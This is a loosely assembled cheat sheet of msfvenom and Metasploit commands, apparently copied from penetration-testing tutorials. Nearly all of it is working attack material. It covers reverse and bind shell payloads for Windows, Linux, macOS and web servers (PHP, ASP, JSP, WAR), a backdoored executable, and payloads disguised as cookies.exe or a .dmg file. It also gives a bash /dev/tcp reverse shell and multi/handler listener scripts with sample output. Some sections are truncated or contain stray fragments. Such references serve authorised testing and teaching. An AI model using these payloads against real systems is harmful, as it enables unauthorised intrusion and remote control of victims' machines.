 msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015. The advantages of msfvenom are: One single tool Standardized command line options Increased speed…

The advantages of msfvenom are:

    One single tool
    Standardized command line options
    Increased speed


[Creating a Payload]

- msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python :: Windows
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe  :: Windows
- msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py :: MAC OS X  - 100%
- msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2 :: Mac OS X
- msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.4  LPORT=4444 -f macho > osx_cam.dmg 
- msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
- msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
- msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
- msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=consulting.example.org LPORT=4443 > metasploit_https.exe

=======
 OS X
=======

- msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py

if you wanted to execute a command to make the Mac text-to-speech command say something on the target computer, you would use the following in Meterpreter

- execute -f /bin/usr/say -a "hey there buddy"
- bash -i >& /dev/tcp/10.0.0.4/443 0>&1 2>&1

=========
 Sintax
=========

-p :: PAYLOAD
-f 

[Establishing a Listener]

- MSFCONSOLE
    - use /exploit/multi/handler
	- set payload windows/meterpreter/reverse_tcp
	- set LHOST <IP>
	- set LPORT 4444
	- set ExitOnSession false
	- exploit -j -z
	- sessions -l
	- sessions -i 2

======================
 Automating Payload
======================

- msfconsole -r msfremote_shell.rc

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 443
set ExitOnSession false
exploit -j

[OUTPUT]

[*] Exploit running as background job.

[*] Started reverse TCP handler on X.X.X.179:4444 
[*] Starting the payload handler...




Active assets	
	- Identified 
	- Classified
	- Determine the objectives and priorities


A list of the most useful msfvenom payloads from Metasploit.
-------------------------------------------------------------

List payloads

msfvenom -l

Binaries

Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

Web Payloads

PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

Scripting Payloads

Python

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

Shellcode

For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

Linux Based Shellcode

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Windows Based Shellcode

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Mac Based Shellcode

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Handlers

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
https://www.offensive-security.com/metasploit-unleashed/msf-os/
http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/
http://netsec.ws/?p=331
